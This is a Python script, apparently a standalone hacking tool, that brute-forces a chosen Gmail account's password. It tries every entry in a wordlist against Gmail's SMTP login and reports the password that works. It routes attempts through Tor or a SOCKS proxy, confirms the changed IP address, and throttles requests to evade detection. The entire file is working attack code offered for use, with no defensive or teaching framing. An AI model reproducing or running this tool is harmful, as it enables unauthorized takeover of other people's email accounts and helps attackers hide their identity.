import smtplib
import argparse
import os
import socks
import requests
import socket
import subprocess
import time
import sys
from functools import wraps
import ipaddress

class Colors:

	@staticmethod
	def red_color(color):
		return "\033[2;31;10m" + color

	@staticmethod
	def purple_color(color):
		return "\033[1;30;10m" + color

	@staticmethod
	def bright_blue(color):
		return "\033[1;34;10m" + color

	@staticmethod
	def green_color(color):
		return "\033[1;32;10m" + color

	@staticmethod
	def white_color(color):
		return "\033[1;37;10m" + color

class Parser:
	def __init__(self):
		self.args = argparse.ArgumentParser(description="Program to bruteforce emails on gmail")
		self.args.add_argument("--email", help="Email you choose to bruteforce", required=True)
		self.args.add_argument("--file", help="Wordlist to pick and try to use to bruteforce", type=self.validate_file, required=True)

		self.args.add_argument("--proxy", help="Set a proxy if you need it. Slower login attempts if set proxy. Defaults to Tor proxy.", type=self.check_valid_ip)
		self.args.add_argument("--port", help="The port number for the proxy. Defaults to 9050 for Tor.", type=self.validate_port)
		self.args.add_argument("--default-proxy", help="Default proxy to tor.", action='store_true')
		self.args.add_argument("--socks", help="Type of socket you want. [SOCKS4, SOCKS5] Recommended for SOCKS5", type=self.validate_socks)

		self.args.add_argument("--save", help="If you want to save the passwords that were incorrect to a file.", action='store_true')
		self.args.add_argument("--time", help="Specify a time to sleep in seconds. Defaults to 0.5 seconds. Proxies can slow the time to log in.", type=self.validate_time)


		self.args_parsed = self.args.parse_args()

	def get_email(self):
		return self.args_parsed.email

	def get_file(self):
		return self.args_parsed.file

	def get_time(self):
		return self.args_parsed.time

	def get_proxy(self):
		return self.args_parsed.proxy

	def get_port(self):
		return self.args_parsed.port

	def get_socks(self):
		return self.args_parsed.socks

	def validate_file(self, file):
		if not os.path.exists(file) or not file.lower().endswith(".txt"):
			self.error_message(f"[-] Invalid file: {file}")
		return file

	def validate_time(self, time):
		time = float(time)
		if not isinstance(time, float):
			self.error_message(f"[-] Invalid time: {str(time)}")
		return time

	def validate_port(self, port):
		port = int(port)
		if port > 65535 or port < 1024:
			self.error_message(f"[-] Invalid port: {str(port)}")
		return port 

	def validate_socks(self, socks):
		socks_list = ["SOCKS4", "SOCKS5"]
		if socks not in socks_list:
			self.error_message(f"Invalid option: {str(socks)}")
		return socks

	def check_valid_ip(self, ip):
		if not ipaddress.ip_address(ip):
			self.error_message("\n[-] Invalid proxy IP. please try again.")
		return ip

	def error_message(self, error):
		print(Colors.red_color(error))
		exit()

def check_tor_running():
	try:
		subprocess.check_output(["pidof", "tor"])
	except subprocess.CalledProcessError:
		print("[-] Tor not running exiting.")
		exit()


def get_arguments():
	try:
		arguments = sys.argv[1:]
	except IndexError:
		pass
	return arguments

def make_file(function):
	@wraps(function)
	def check_for_save(*args):
		arguments = get_arguments()
		if "--save" in arguments:
			try:
				with open("incorrect_passwords.txt", "a") as f:
					f.write(args[2])
					f.write("\n")
					f.close()
			except PermissionError:
				print("[-] Invalid permissions. Please try with sudo")
				exit()
			return function(*args)
		return function(*args)
	return check_for_save


def sleep_timer(function):
	@wraps(function)
	def grab_user_time(*args):
		user_time = Parser().get_time()
		arguments = get_arguments()

		if "--time" in arguments:
			time.sleep(user_time)
			return function(*args)
		time.sleep(0.5)
		return function(*args)
	return grab_user_time

class Email:
	def __init__(self, email, password):
		self.email = email
		self.password = password

		self.email_connection(self.email, self.password)


	@sleep_timer
	@make_file
	def email_connection(self, email, password):
		gmail_server = smtplib.SMTP('smtp.gmail.com', 587)
		gmail_server.starttls()

		try:
			gmail_server.login(email, password)
			correct_password = f"[+] Got the password [==>] {password}"
			self.remove_correct_password()
			print(Colors.green_color(correct_password))
			exit()
		except smtplib.SMTPAuthenticationError:
			incorrect_password = f"[-] Incorrect password [==>] {password}"
			print(Colors.purple_color(incorrect_password))

	def remove_correct_password(self):
		with open("incorrect_passwords.txt", "r") as f:
			data = f.readlines()
			f.close()
			os.remove("incorrect_passwords.txt")
			new_data = data[:-1]

			for letters in new_data:
				letters = letters.strip()
				with open("incorrect_passwords.txt", "a") as f:
					f.write(letters)
					f.write("\n")
					f.close()

class Proxy(Parser):
	def __init__(self):
		super().__init__()
		self.port = self.get_port()
		self.proxy_ip = self.get_proxy()
		self.socket_type = self.get_socks()

	def requests_ip_check(self):
		try:
			return requests.get("http://icanhazip.com")
		except Exception:
			print("[-] Error. Invalid options.")
			exit()

	def change_ip(self):
		current_ip = self.requests_ip_check()
		get_ip = f"[-] Your current IP is {current_ip.content.decode()}"
		print(Colors.red_color(get_ip))
		print("\n")

		if self.proxy_ip and self.port:
			self.socket_connection(self.socket_type, self.proxy_ip, self.port)
		else:
			self.socket_connection("SOCKS5", "127.0.0.1", 9050)

		fresh_ip = self.requests_ip_check()
		new_ip = f"[+] New IP --> {fresh_ip.content.decode()}"
		print(Colors.bright_blue(new_ip))

	def socket_connection(self, socket_type, ip, port):
		type_of_socket = socket_type

		if type_of_socket == "SOCKS4":
			socks.set_default_proxy(socks.SOCKS4, ip, port)
			socket.socket = socks.socksocket

		elif type_of_socket == "SOCKS5":
			socks.set_default_proxy(socks.SOCKS5, ip, port)
			socket.socket = socks.socksocket

		else:
			print("\n[-] Invalid socket.")
			exit()



class BruteForce(Parser):
	def __init__(self):
		super().__init__()
		self.email = self.get_email()
		self.file = self.get_file()
		dash = "-" * 20
		print(f"\n{str(dash)} Starting {str(dash)}\n")

	def read_file(self):
		with open(self.file, "r") as file:
			content = file.readlines()

		for words in content:
			words = words.strip()
			yield words

	def email_login(self):
		password_list = self.read_file()
		count = 0

		for passwords in password_list:
			count += 1
			Email(self.email, passwords)
			print(f"Amount of tires --> {str(count)}")
		print("\n[-] Password was not found.")


if __name__ == '__main__':
	try:
		arguments = sys.argv[1:]

		if "--proxy" in arguments and "--port" in arguments and "--socks" in arguments:
			Proxy().change_ip()
			BruteForce().email_login()
		else:
			BruteForce().email_login()
	except KeyboardInterrupt:
		print("[-] Exiting.")
		exit()
